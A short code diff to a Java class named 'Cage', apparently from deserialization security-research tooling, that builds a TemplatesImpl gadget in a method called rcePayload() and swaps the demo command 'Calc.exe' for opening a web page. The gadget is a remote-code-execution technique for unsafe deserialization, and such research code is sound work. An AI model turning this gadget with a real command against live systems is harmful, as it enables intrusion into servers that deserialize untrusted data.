@@ -95,7 +95,7 @@ public class Cage {
   public static String rcePayload() throws
       IllegalAccessException, ClassNotFoundException, InstantiationException, CannotCompileException,
       NotFoundException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
-    String[] args = {"Calc.exe"};
+    String[] args = {"open", "http://www.google.com"};
     Object tpl = TemplatesUtil.createTemplatesImpl(args);
     byte[][] bytecodes = (byte[][]) Reflections.getFieldValue(tpl, "_bytecodes");
     Map<String, String> values = new LinkedHashMap<>();
@@ -113,7 +113,7 @@ public class Cage {
       IllegalAccessException, ClassNotFoundException, InstantiationException, CannotCompileException,
       NotFoundException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
     Properties props = System.getProperties();
-    props.setProperty("upstreamXalan", "false");
+    props.setProperty("upstreamXalan", "true");
 
     // Writes gadget by hand and then deserializes using unmarshal
     String json = rcePayload();
